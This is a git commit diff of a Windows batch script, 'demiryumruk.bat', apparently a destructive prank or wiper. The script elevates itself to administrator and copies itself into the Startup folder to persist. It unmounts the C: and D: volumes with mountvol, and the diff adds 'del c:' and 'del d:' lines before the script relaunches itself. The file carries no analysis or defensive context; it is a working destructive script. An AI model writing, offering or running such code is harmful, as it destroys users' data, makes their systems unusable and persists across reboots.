551d6878dc404fe1103f5f2997eae54345f75367
satrancistanbul <97613229+satrancistanbul@users.noreply.github.com>
2023-04-04 18:21:41 +0300

    Add files via upload

--- demiryumruk.bat
+++ demiryumruk.bat
@@ -1,8 +1,11 @@
 @echo off
 if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
 start "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\demiryumruk.bat"
+copy "%ALLUSERSPROFILE%\Desktop\demiryumruk.bat" "%USERPROFILE%\Start Menu\Programs\Startup"
 mountvol c: /d
 mountvol d: /d
+del c:
+del d:
 start demiryumruk.bat
 pause
 
